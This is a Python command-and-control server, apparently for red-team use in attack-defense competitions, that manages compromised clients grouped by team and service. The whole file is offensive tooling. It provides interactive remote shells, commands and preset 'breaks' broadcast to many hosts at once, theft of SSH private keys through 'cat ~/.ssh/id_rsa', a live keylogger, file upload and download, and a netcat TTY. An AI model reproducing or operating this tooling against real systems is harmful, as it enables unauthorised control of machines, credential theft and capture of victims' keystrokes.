import json
import subprocess
import os
import socket, threading, time
import sys
import signal
import pty
from cmd import Cmd


#TODO A user can make groups and add clients to groups. The user then can select from each group which client to connect to.
#TODO Develop new shell with cmd module
#TODO Encrypt traffic

# class MainShell(cmd):
#     pass 

class Team():
    def __init__(self, identity):
        self.identity = identity
        self.clients = []
        self.expectedHosts = set() #Set of expected hosts
    
    def assign(self, client):
        self.clients.append(client) #Append the client to the clients list
        client.setTeam(self)

    def unassign(self, client):
        self.clients.remove(client) #Append the client to the clients list
        client.unsetTeam(self)

    def listClients(self):
        print("> Team " + self.identity + ":")
        for client in self.clients:
            if client.isUp():
                print("    >> " + client.IP)
    
    def listExpectedClients(self):
        print("> Team " + self.identity + ":")
        for host in self.expectedHosts: #for each expected host
            for client in self.clients: #see if active clients match
                if host == client.IP: #if the host matches the IP
                    if client.isUp(): #if the client is up
                        print("    >> " + host) #print the host if all is true
                        continue
            print("    >> " + host + " [X]") #print the host if it's down

class Service():

    def __init__(self, name):
        self.name = name
        self.clients = []
        self.identifier = list()
        self.cloudIdentifier = list()
        self.breaks = dict()
    
    def addIdentifier(self,host):
        self.identifier.append(host)
    
    def addCloudIdentifier(self,host):
        self.cloudIdentifier.append(host)

    def getBreaks(self):#Parse file stored in config for breaks
        with open("config.json") as file:
            self.breaks = json.load(file)["breaks"]
            self.breaks = self.breaks[0][self.name][0]

    def listBreaks(self):
        print("Breaks:")
        for b in self.breaks:
            print(f"\t{b} - {self.breaks[b]}")

    def sendBreak(self):
        print("Select a break to send. ")
        self.getBreaks()
        self.listBreaks()
        selected = None
        while selected != "exit":
            selected = input("Input the name of a break to send: ")
            if selected in self.breaks:
                print("Send the command: " + self.breaks[selected] + "?")
                userIn = input("Y/N: ")
                if userIn.lower() == "y":
                    print("Sending break to all clients.")
                    for client in self.clients:
                        try:
                            client.getSocket().send(self.breaks[selected].encode())
                            resp = threading.Thread(target=client.receiveResp)
                            resp.start() #server needs to receive response or it will just hang
                            print("Successfully sent command to: " + str(client.getAddr()))
                        except:
                            print("Failed to send command to client: " + str(client.getAddr()))
                    print("Command sent to " + str(len(self.clients)) + " clients.")
                    time.sleep(.2 * len(self.clients)) #wait .2 seconds for each client 
                else:
                    print("Cancelled!")
            else:
                print("Selected break not in breaks!")

    def shell(self):
        userIn = input("Enter a command to send to all " + self.name + " clients: ")
        while userIn.lower() != "exit":
            if userIn != "":
                for client in self.clients:
                    try:
                        # x = threading.Thread(target=self.clients[client].sendCommand(userIn))
                        # x.start()
                        client.getSocket().send(userIn.encode())
                        resp = threading.Thread(target=client.receiveResp)
                        resp.start() #server needs to receive response or it will just hang
                        print("Successfully sent command to: " + str(client.IP))
                    except:
                        print("Failed to send command to client: " + str(client.IP))
                print("Command sent to " + str(len(self.clients)) + " clients.")
            time.sleep(.05 * len(self.clients)) #wait .05 seconds for each client 
            userIn = input("Enter a command to send to all " + self.name + " clients: ")
    
    def listClients(self):
        print("Active Clients: ")
        for client in self.clients:
            try:
                if client.isUp():
                    print("\t" + str(client.IP))
                else:
                    removeClient(client)
                    print("Connection lost to: " + str(client.IP))
            except:
                removeClient(client)

    def assign(self, client):
        self.clients.append(client) #Append the client to the clients list
        client.setService(self)

class Connection:
    def __init__(self, addr, socket, IP):
        UNASSIGNED_CONNECTIONS.append(self)
        self.tags = list()
        self.IP = IP
        self.port = addr[1]
        self.socket = socket
        self.addr = addr
        self.nickName = str(addr)
        self.team = 'N/A'
        self.service = 'N/A'
        self.tags = []
        self.serviceID = 'N/A'
        self.assign_client()
    
    def addTags(self, tag):
        self.tags.append(tag)
    
    def setNickName(self, nickname):
        self.nickName = nickname

    def getSocket(self):
        return self.socket
    
    def getAddr(self):
        return self.addr
    
    def getNick(self):
        return self.nickName

    def setTeam(self, team):
        self.team = team
    
    def unsetTeam(self, team):
        self.team = None
    
    def setService(self, service):
        self.service = service

    def assign_client(self):
        ip_splitted = self.IP.split(".") #Split the IP on the .
        if ip_splitted[0] == IP_FORMAT.split(".")[0]: #Check if the host is LAN or cloud
            teamIndex = TEAM_INDEX
            serviceIndex = SERVICE_INDEX
            cloud = False
        else:
            teamIndex = TEAM_INDEX_CLOUD
            serviceIndex = SERVICE_INDEX_CLOUD
            cloud = True
        # print("Service Index: " + str(serviceIndex))
        print("\nNew Connection From: " + self.IP)
        self.serviceID = self.IP.split(".")[serviceIndex]
        team = ip_splitted[teamIndex]
        if team not in TEAMS:
            # print("Team \"" + team + "\" does not exist! Creating..." )
            addTeam(str(team))
        assignTeam(self,TEAMS[team])
        assignService(self,self.serviceID,cloud)

    def sendCommand(self,command): #Send command to client and return output
        self.socket.send(command[0].encode())
        return self.socket.recv(BUFFER_SIZE).decode()
    
    def receiveResp(self):
        print("\tClient (" + str(self.IP) + ") response: '" + str(self.socket.recv(BUFFER_SIZE).decode()).strip() + "'")
        return
    
    #returns true if client is up
    def isUp(self):
        try:
            self.socket.send("beacon_ping".encode())
            if self.socket.recv(BUFFER_SIZE).decode() == "beacon_pong": #send ping and if the response doesn't exist, it's not up
                return True
            return False
        except:
            return False
    
    def getIP(self):
        self.socket.send("getIP".encode())
        self.IP = self.socket.recv(BUFFER_SIZE).decode()
    
    def setIP(self, IP):
        self.IP = IP
        
#DEFAULT VALUES
SERVER_ADDR = "127.0.0.1"
SERVER_PORT = 8080
BUFFER_SIZE = 1024 * 128 #128KB max size
CURRENT_CONNECTIONS = []
CURRENT_IPS = []
CURRENT_CONNECTIONS_CLASS = []
CURRENT_ADDRESSES = []
TEAMS = {}
SERVICES = {}
UNASSIGNED_CONNECTIONS = []
IP_FORMAT = "X.X.TEAM.HOST"
HOSTS = set()
CLOUDHOSTS = set()

# #If the user starts the server and wants to specify the ip to host on <<OLD>>
# if len(sys.argv) == 2:
#     SERVER_ADDR = sys.argv[1]
# elif len(sys.argv) == 3:
#     SERVER_ADDR = sys.argv[1]
#     SERVER_PORT = int(sys.argv[2])

def selectClient():
    selectedTeam = None
    selectedClient = None
    print("\nSelect Team")
    if len(TEAMS) == 0:
        print("No active teams!")
        return
    for team in TEAMS:
        print(f"{TEAMS[team].identity} ({len(TEAMS[team].clients)})")
    while not selectedTeam:
        try:
            x = input("Select a team: ")
            if "exit" in x:
                return
            selectedTeam = TEAMS[x]
        except:
            pass
    print("Select Client")
    i = 0
    if len(selectedTeam.clients) == 0:
        print("Team has no clients!")
        return
    for client in selectedTeam.clients:
        print(f"{i} - {str(client.IP)}")
        i += 1
    while not selectedClient:
        try:
            x = input("Select a client: ")
            if "exit" in x:
                return
            selectedClient = selectedTeam.clients[int(x)]
        except:
            pass
    client_console(selectedClient)


#Start server and listen for new connections
def startServer():
    asciiArt = '''
 _____                 _              _     _____             _             _ 
/  __ \               | |            | |   /  __ \           | |           | |
| /  \/ ___  _ __  ___| |_ __ _ _ __ | |_  | /  \/ ___  _ __ | |_ _ __ ___ | |
| |    / _ \| '_ \/ __| __/ _` | '_ \| __| | |    / _ \| '_ \| __| '__/ _ \| |
| \__/\ (_) | | | \__ \ || (_| | | | | |_  | \__/\ (_) | | | | |_| | | (_) | |
 \____/\___/|_| |_|___/\__\__,_|_| |_|\__|  \____/\___/|_| |_|\__|_|  \___/|_|
                                                                              
                                                                              
    '''
    print(asciiArt)
    server_sock.listen(5)
    print()
    print(f"Server is listening on {SERVER_ADDR}:{SERVER_PORT}")
    print()
    SERVER_UP = True
    try:
        while SERVER_UP:
            client_sock, addr = server_sock.accept()
            # print()
            # print()
            # print(f"\n[SERVER] New Connection Received From: {addr[0]}:{addr[1]}")
            client_sock.send("getIP".encode())
            IP = client_sock.recv(BUFFER_SIZE).decode()
            if IP in CURRENT_IPS: #if there is already a connection, drop the new one
                client_sock.send("ENDCONNECTION".encode())
                continue
            try:
                X = Connection(addr,client_sock, IP)
            except:
                continue
            CURRENT_CONNECTIONS_CLASS.append(X)
            CURRENT_CONNECTIONS.append(client_sock)
            CURRENT_ADDRESSES.append(addr)
            CURRENT_IPS.append(X.IP)
            # print(f"[SERVER] Active Connections: {threading.activeCount() - 6}")
            # print("cmd>")
    except (KeyboardInterrupt, SystemExit, ConnectionAbortedError):
        server_sock.close()
        shutdown_clients()
        SERVER_UP = False
    except (ConnectionResetError) as e:
        print("Error on a connection. Continuing.")
        
#Take socket and addr and issue shell
def handleClient(client):
    client_sock = client.getSocket()
    addr = client.IP
    while True:
        try:
            user_in = input()
            if user_in == 'exit':
                client_sock.send(user_in.encode())
                return True
            elif user_in == '':
                print(f"{addr}>",end='')
            elif user_in.split()[0] == "cd":
                client_sock.send(user_in.encode())
                print(f"{addr}>",end='')
                continue
            else:
                client_sock.send(user_in.encode())
                client_sock.settimeout(3.0) #timeout after 3 seconds of no recv
                serv_resp = client_sock.recv(BUFFER_SIZE).decode()
                client_sock.settimeout(None) #reset timeout
                print(f"{serv_resp}")
                print(f"{addr}>",end='')
        except socket.timeout as e:
            print("Process timed out. \n" + str(e))
            print(f"{addr}>",end='')
        except BrokenPipeError as e:
            print("Connection closed. Broken pipe.")
            removeClient(client)
            return False
        except ConnectionResetError as e:
            print("Connection reset by client.")
            removeClient(client)
            return False
        except Exception as e:
            print("Error sending command! \n" + str(e))
            print(f"{addr}>",end='')
            continue

def removeClient(client):
    try:
        client.socket.send("reset_connection".encode())
    except: 
        pass
    try: #try to remove everything, but it might already be gone
        CURRENT_IPS.remove(client.IP)
        for service in SERVICES:
            if client in SERVICES[service].clients:
                SERVICES[service].clients.remove(client)
        CURRENT_CONNECTIONS_CLASS.remove(client)
        CURRENT_CONNECTIONS.append(client.socket)
        CURRENT_ADDRESSES.append(client.addr)
        client.team.unassign(client)
    except: 
        pass

def copyKey(client_sock):
    try:
        client_sock.send("hostname".encode())
        hostName = client_sock.recv(BUFFER_SIZE).decode().strip()
        if os.path.exists(f"{os.path.expanduser('~')}/client_keys/{hostName}"):
            print("Private key exists for: " + hostName)
            print("\n>",end="")
            return
        try:
            subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys/{hostName}",shell=True)
        except:
            subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys",shell=True)
            subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys/{hostName}",shell=True)
        client_sock.send("cat ~/.ssh/id_rsa".encode())
        subprocess.run(f"touch {os.path.expanduser('~')}/client_keys/{hostName}/id_rsa",shell=True)
        with open(f"{os.path.expanduser('~')}/client_keys/{hostName}/id_rsa","w") as file:
            file.write(client_sock.recv(BUFFER_SIZE).decode())
            print(f"Private key copied for: {hostName}")
        print("\n>",end="")
    except:
        print("Private key NOT copied!")
    
#Main Console for C2
def handleCommand():
    while True:
        try:
            cmd = input("cmd> ")
            if cmd.lower() == "list" or cmd.lower() == "ls":
                list_clients()
            elif cmd.lower() == "lsteam" or cmd.lower() == "listteam":
                listTeams()
            elif "assign" in cmd.lower():
                assignLoop()
            elif "mkteam" in cmd.lower():
                addTeam(input("Input team name: "))
            elif "select" in cmd.lower() or "sel" in cmd.lower():
                selectClient()
                # client_console(cmd)
                # client,addr = select_client(cmd)
                # if client == None:
                #     print("Client does not exist!")
                # else:
                #     handleClient(client,addr)
            elif "lsall" in cmd.lower():
                for team in TEAMS:
                    TEAMS[team].listExpectedClients()
            elif cmd.lower() == "help":
                print("\nHelp Menu: \n\tUse 'list' to list active connections. \
                    \n\tUse 'select' to choose a client from the list. \
                    \n\tUse 'lsteam' to list each team's connections. \
                    \n\tUse 'assign' to assign a client to a team. \
                    \n\tUse 'mkteam' to create a team. \
                    \n\tUse 'lsall' to list all expected clients and their status. \
                    \n\tUse 'service' to list services. \
                    \n\tUse 'help' to show this menu. \
                    \n\tUse 'exit' to quit the program.")
            elif cmd.lower() == "exit":
                print("[SERVER] Server is closing. Goodbye!")
                #SHUTDOWN ALL CONNECTIONS
                shutdown_clients() 
                server_sock.close()
                break
            elif "service" in cmd.lower():
                serviceShell()
            else:
                print("Command unknwon. Use 'help' to list commands.")
        except (KeyboardInterrupt, SystemExit, ConnectionAbortedError):
            print("\nUse 'exit' to close.")
        except Exception as e:
            print("Invalid use of command! \n" + str(e))
            
def serviceShell():
    userIn = "notAService"
    while userIn not in SERVICES.keys():
        if userIn.lower() == "exit":
            return
        print("\nPlease select a service below: ")
        for service in SERVICES:
            print("\t>> " + service + " - " + str(len(SERVICES[service].clients)) + " active clients")
        userIn = input("Enter the name of the service you want to select: ")
    service = SERVICES[userIn]
    while "exit" not in userIn:
        userIn = input(f"{service.name}>").lower()
        if "help" in userIn:
            print("Client help menu:")
            print("\tEnter ls to list all stored breaks and their purpose")
            print("\tEnter select to select a break to send")
            print("\tEnter shell for a shell to every client connected under this service")
            print("\tEnter clients for a list of currently connected clients")
            print("\tUse reload to reload the break list")
        elif "ls" in userIn or "list" in userIn:
            service.getBreaks()
            service.listBreaks()
        elif "select" in userIn or "sel" in userIn:
            service.sendBreak()
        elif "shell" in userIn:
            service.shell()
        elif "clients" in userIn:
            service.listClients()
        elif "reload" in userIn:
            service.getBreaks()
        elif "exit" in userIn:
            break
        else:
            print("Invalid command!")

#List Current Connections
def list_clients():
    results = ""
    i = 0
    for client in CURRENT_CONNECTIONS:
        try:
            cwd = None
            client.send(str.encode('pwd'))
            cwd = client.recv(BUFFER_SIZE).decode()
            client.send(str.encode('whoami'))
            whoami = client.recv(BUFFER_SIZE).decode()
            whoami = whoami.strip()
            if cwd is None or cwd == "":
                CURRENT_CONNECTIONS.remove(i)
                CURRENT_ADDRESSES.remove(i)
        except:
            del CURRENT_CONNECTIONS[i]
            del CURRENT_ADDRESSES[i]
            continue

        results += str(i) + " - " + whoami + "@" + str(CURRENT_ADDRESSES[i][0]) + ":" + str(CURRENT_ADDRESSES[i][1]) + ":" + str(cwd) + "\n"
        i+=1

    if len(CURRENT_CONNECTIONS) != 0:
        print("[SERVER] ACTIVE CLIENTS:")
        print(results)
    else:
        print("No active connections!")

def addTeam(identity):
    TEAMS[identity] = Team(str(identity))
    print("Team \"" + str(identity) + "\" created successfully.")

def assignTeam(client, team):
    team.assign(client)
    UNASSIGNED_CONNECTIONS.remove(client)

def assignService(client, service, cloud:bool):
    if cloud: #if it's a cloud box, search the cloud services
        for i in SERVICES:
            if service in SERVICES[i].cloudIdentifier:
                SERVICES[i].assign(client)
    else:
        for i in SERVICES:
            if service in SERVICES[i].identifier:
                SERVICES[i].assign(client)

def listTeams():
    print("Team's Connections:")
    for team in TEAMS:
        TEAMS[team].listClients()
    if(UNASSIGNED_CONNECTIONS):
        print("\nUnassigned Clients: ")
        for client in UNASSIGNED_CONNECTIONS:
            print(client.getNick())

def listTeamsFull():
    print("Team's Connections:")
    for team in TEAMS:
        TEAMS[team].listStatusClients()
    if(UNASSIGNED_CONNECTIONS):
        print("\nUnassigned Clients: ")
        for client in UNASSIGNED_CONNECTIONS:
            print(client.getNick())

def assignLoop():
    while(UNASSIGNED_CONNECTIONS):     #If there are unassigned clients
        print("Current Unassigned Clients: ")
        for i in range(len(UNASSIGNED_CONNECTIONS)):
            print(f"\t{i} - {UNASSIGNED_CONNECTIONS[i].getNick()}")
        target = input("Enter the index of which user you would like to assign: ")
        if target == "exit":
            print("Exiting.")
            break
        else:
            client = UNASSIGNED_CONNECTIONS[int(target)]
        for i in range(len(TEAMS)):
            print(f"\t{i} - {TEAMS[i].identity}")
        target = input(f"Enter the index of which team you would like {client.getNick()} to: ")
        if target == "exit":
            print("Exiting.")
            break
        else:
            assignTeam(client, TEAMS[int(target)])
    else:
        print("There are no unassigned clients!")

    #List unassigned clients
    #Ask user to input which client to assign
    #If the user says exit, then quit
    #List teams
    #Ask user which team to assign client to
    #If the user says exit, then quit
    #If there are more unassigned clients, repeat
    #TODO add ability to reassign

#Console to send commands to a client when user selects client
def client_console(client): #previously took in cmd
    try:
        # target = cmd.replace("select ", "")
        # target = cmd.replace("sel ", "")
        # target = int(target)
        # connection = CURRENT_CONNECTIONS_CLASS[target]
        connection = client

        print("Connected to: " + str(client.IP) + ":" + str(client.port))
        while True:
            print("Console: " + str(client.IP)+">",end="")
            newCMD = input()
            if "shell" in newCMD:
                clientSock = connection
                addr = client.getAddr()
                if client == None:
                    print("Client does not exist!")
                else:
                    print("Active Shell On: " + str(client.IP) + ":" + str(client.port))
                    print("\n" + str(client.IP) + ">",end = '')
                    if not handleClient(clientSock): #if this errors, break the shell
                        break
            elif "dl" in newCMD: #Download file
                download_file(newCMD,clientSock)
            elif "up" in newCMD: #Upload file
                upload_file(newCMD,clientSock)
            elif "keylogger" in newCMD:
                start_keylog(newCMD,clientSock)
            elif "tty" in newCMD:
                startTTY(client.IP)
            elif "key" in newCMD.lower():
                copyKey(clientSock)
            elif "ncport" in newCMD.lower():
                clientSock.socket.send("ncport".encode())
                print("Netcat is being hosted on: " + client.IP + ":" + clientSock.socket.recv(BUFFER_SIZE).decode())
            elif "setnick" in newCMD.lower():
                newCMD.replace("setnick","")
                client.setNickName(newCMD)
            elif "reset" in newCMD.lower():
                connection.socket.send("reset_connection".encode())
            elif "setip" in newCMD.lower():
                client.setIP(input("Enter IP to set client to: "))
            elif "help" in newCMD: #Help menu
                print("\nHelp Menu:\
                    \n\tUse 'exit' to return to main menu. \
                    \n\tUse 'help' to show this menu. \
                    \n\tUse 'shell' to gain a shell on the client's machine \
                    \n\tUse 'key' to copy the clients SSH key to your machine \
                    \n\tUse 'dl' to download a file.\
                    \n\tUse 'ul' to upload a file.\
                    \n\tUse 'keylogger' to start a live keylog of the clients machine.\
                    \n\tUse 'ncport' to get the port the shell is listening on.\
                    \n\tUse 'setnick' to set the nickname of the machine.\
                    \n\tUse 'ENDCONNECTION' in shell to end the connection.\
                    \n\tUse 'setIP' to set the client IP\
                    \n\tUse 'tty' to start a new TTY in netcat.\n")
            elif "exit" in newCMD:
                break
            else:
                print("Command unknwon. Use 'help' to list commands.")
    except Exception as e:
        print("Invalid use of command! \n" + str(e))

#Used to break keylogger with ctrl-z
def ctrlC(signum, frame):
    raise KeyboardInterrupt

def start_keylog(cmd,conn):
    signal.signal(signal.SIGTSTP, ctrlC)
    signal.signal(signal.SIGTERM, ctrlC)
    print("Keylogger starting...\nIMPORTANT:\nUse ctrl+z & ctrl+c to end logging.")
    conn.send("START_KEYL0GGER".encode())
    try:
        log = ''
        print()
        os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
        while True:
            print("Keylogger in progress...\nUse ctrl+z & ctrl+c to end logging.\n")
            print(f"{log}",end="\r")
            out = conn.recv(BUFFER_SIZE).decode()
            if out == "NO_DEPENDENCIES":
                print("Dependencies for keylogger not installed on target.")
                break
            os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
            if out == "BACKSPACE": #If the user hit backspace, delete one keystroke from the string
                try:
                    if log[len(log)-1] == ")": #check if the last char is a ), it might be a Key.
                        i = len(log)-1 #Set i = length of the log - 1
                        while(log[i]) != "(": #Iterate backwards until we find a (
                            i-=1
                        if log[i:i+4] == "(Key": #If the string is '(Key' then we found a key to delete. 
                            log = log[:i-1] #Delete the keystroke and one char before it
                        else:
                            log = log[:-1]
                    else:
                        log = log[:-1] #If the last char isn't a ), then just delete one char
                except IndexError:
                    log = log[:-1] + ' ' #If index out of bounds, just delete one and add a space
            elif out == "ENTER": #If the user hit enter, make a new line
                log += "\n"
            else:
                log += out

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
        conn.send("KEY_L0GGER-END".encode())
        print("Keylogger ending... Returning to client menu.")
        
def download_file(cmd,conn):
    try:
        conn.send(("DOWNLOAD_FILE_FROM_S3RVER").encode()) #Tell client we want to download
        path = cmd.replace("dl ","") #Get the path of the requested download
        if conn.recv(BUFFER_SIZE).decode() == "READY": #Wait for client to be ready
            conn.send(path.encode()) #Send the path to client
            path = path.split("/") #Split the path by slash
            with open(path[len(path)-1],"ab") as f: #Open a file with just the filename
                data = conn.recv(BUFFER_SIZE) #Recieve data from client
                while data: #While data is not None
                    if data.decode() == "DOWNLOADING_FILE_FROM_S3RVER_COMPLETE": #If it is done, break
                        break
                    elif data.decode() == "DOWNLOAD_ERROR": #If there's an error, tell us and break
                        print("File was not found on target machine.")
                        break
                    f.write(data) #Write to the file
                    conn.send("ACK".encode()) #Tell the client we got it
                    data = conn.recv(BUFFER_SIZE) #Wait for more data
            print(path[len(path)-1] + " saved to: " + os.getcwd()) #Print that the file was downloaded and saved
    except KeyboardInterrupt as e:
        print("File Download Stopped.")

def upload_file(cmd,conn):
    try:
        path = cmd.replace("up ","")
        conn.send(("UPLOADING_FILE_FROM_S3RVER").encode())
        if conn.recv(BUFFER_SIZE).decode() == "READY":
            conn.send(path.encode())
            with open(path,"rb") as f:
                data = f.read(BUFFER_SIZE)
                while data:
                    conn.send(data)
                    if(conn.recv(BUFFER_SIZE).decode()) == "ACK":
                        data = f.read(BUFFER_SIZE)
                    else:
                        print("An error has occured!")
                        break

                conn.send("UPLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
                if conn.recv(BUFFER_SIZE).decode() == "DONE":
                    print("File uploaded successfully!")

    except FileNotFoundError or FileExistsError as e:
        conn.send("UPLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
        print("File not found! \n"+ str(e))
    except KeyboardInterrupt:
        print("File Upload Stopped.")

#Start server as a thread to constantly accept new clients, then open the C2 console.
def create_threads():
    t = threading.Thread(target=startServer) 
    t.daemon = True
    t.start()
    t = threading.Thread(target=checkInThread)
    t.daemon = True
    t.start()
    time.sleep(.5)
    handleCommand()

#Open TTY by connecting via netcat
def startTTY(IP):
    OS = sys.platform
    if OS == "win32" or "cygwin": #If the machine is Windows
        pass
    if OS == "linux" or "darwin" or "freebsd": #If the machine is linux or MacOS or FreeBSD
        try:
            print("Entering TTY!")
            pty.spawn(f"/usr/local/bin/netcat {IP} 8081")
        except KeyboardInterrupt:
            print("Exiting TTY!")

#Disconnect all clients and end sockets - UPDATED TO RESET CONNECTION TO KEEP ALIVE
def shutdown_clients():
    for conn in CURRENT_CONNECTIONS:
        try:
            conn.send("reset_connection".encode())
        except:
            continue

def createService(service,identifier,cloud:bool):
    if service not in SERVICES:
        SERVICES[service] = Service(service) #make the service
        print("Successfully created service: " + service)
    hosts = identifier.split(",")
    for host in hosts:
        if cloud:
            SERVICES[service].addCloudIdentifier(host) #add an Identifier
            print("Successfully added cloud identifier " + host + " to service: " + service)
            global CLOUDHOSTS #append the identifier to the set of hosts
            CLOUDHOSTS.add(host)
        else:
            SERVICES[service].addIdentifier(host) #add an Identifier
            print("Successfully added identifier " + host + " to service: " + service)
            global HOSTS #append the identifier to the set of hosts 
            HOSTS.add(host)
#Takes in config file and creates necessary objects 
def setup():
    try:
        with open("config.json") as config:
            config = json.load(config) #Load the config file
        for service in config["services"][0]: #Create a service for each service
            createService(service,config["services"][0][service],False)
        for service in config["cloud_services"][0]: #Create a service for each cloud service
            createService(service,config["cloud_services"][0][service],True)
        global TEAMS_INT
        TEAMS_INT = int(config["topology"][0]["teams"]) #Pull the # of all teams
        global SERVER_ADDR
        SERVER_ADDR = config["topology"][0]["serverIP"]
        global SERVER_PORT
        SERVER_PORT = int(config["topology"][0]["serverPort"])
        global IP_FORMAT
        IP_FORMAT = config["topology"][0]["ipSyntax"]
        global SERVICE_INDEX
        SERVICE_INDEX = IP_FORMAT.split(".").index("HOST")
        global TEAM_INDEX
        TEAM_INDEX = IP_FORMAT.split(".").index("TEAM")
        global IP_FORMAT_CLOUD
        IP_FORMAT_CLOUD = config["topology"][0]["ipSyntaxCloud"]
        global SERVICE_INDEX_CLOUD
        SERVICE_INDEX_CLOUD = IP_FORMAT_CLOUD.split(".").index("HOST")
        global TEAM_INDEX_CLOUD
        TEAM_INDEX_CLOUD = IP_FORMAT_CLOUD.split(".").index("TEAM")
        for i in range(TEAMS_INT): #Create all teams and give them a list of expected clients
            addTeam(str(i))
            makeExpectedList(i)
            # print("Successfuly created team: " + str(i))
    except:
        print("Could not parse config file! Please restart C2 with the correct format!")
        global server_sock
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #bind the server to that IP and port
    server_sock.bind((SERVER_ADDR, SERVER_PORT))

def makeExpectedList(teamNumber):
    expected = list()
    for host in HOSTS:
        #use ipSyntax
        tempHost = IP_FORMAT.replace("TEAM",str(teamNumber))
        tempHost = tempHost.replace("HOST",str(host))
        expected.append(tempHost)
    for host in CLOUDHOSTS:
        tempHost = IP_FORMAT_CLOUD.replace("TEAM",str(teamNumber))
        tempHost = tempHost.replace("HOST",str(host))
        expected.append(tempHost)
        #use ipSyntaxCloud
    TEAMS[str(teamNumber)].expectedHosts = expected

# def startCheckInThread():
#     global server_sock_checkin
#     server_sock_checkin = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #bind the check in server to that IP and port
#     server_sock_checkin.bind((SERVER_ADDR, SERVER_PORT+5)) #start the checkin on the port + 5

def checkInThread():
    time.sleep(20)
    while True:
        for client in CURRENT_CONNECTIONS_CLASS:
            try:
                client.socket.send("beacon_ping".encode()) #send ping and expect a pong back
                # print("Ping sent to: " + str(client.IP))
                client.socket.settimeout(3.0) #timeout after 3 seconds of no recv
                resp = client.socket.recv(BUFFER_SIZE).decode()
                client.socket.settimeout(None) #reset timeout
                if resp != "beacon_pong": #if the client sends something else back
                    removeClient(client)
                # print("Pong received from: " + str(client.IP))
            except (BrokenPipeError,ConnectionRefusedError,ConnectionResetError) as e:
                removeClient(client)
            # except client.socket.timeout as e:
            #     removeClient(client)
            except: #anything else breaks? keep going
                pass
        time.sleep(60) #check in every minute

if __name__ == "__main__":
    print("[SERVER] Server is starting...") 
    setup()
    time.sleep(1)
    create_threads()